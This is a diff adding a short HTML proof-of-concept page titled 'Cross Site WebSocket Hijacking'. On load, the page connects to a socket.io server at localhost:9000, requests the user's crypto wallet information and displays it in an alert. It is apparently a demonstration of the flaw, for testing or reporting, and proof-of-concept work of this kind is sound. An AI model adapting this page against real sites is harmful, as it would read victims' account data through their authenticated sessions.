@@ -1,0 +1,18 @@
+<html>
+<head>
+<!-- websocket client library v2.3.0 -->
+<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2.3.0/dist/socket.io.min.js"></script>
+</head>
+<body>
+<center>Cross Site WebSocket Hijacking</center>
+<script>
+window.onload = function(){
+  var socket = io.connect('http://localhost:9000/'); // connect to websocket host
+  socket.emit('crypto_usd_value'); // send websocket message to receive user wallet information
+  socket.on('crypto_usd_value', data =>{
+    alert(JSON.stringify(data)) // alert user wallet information
+  })
+}
+</script>
+</body>
+</html>
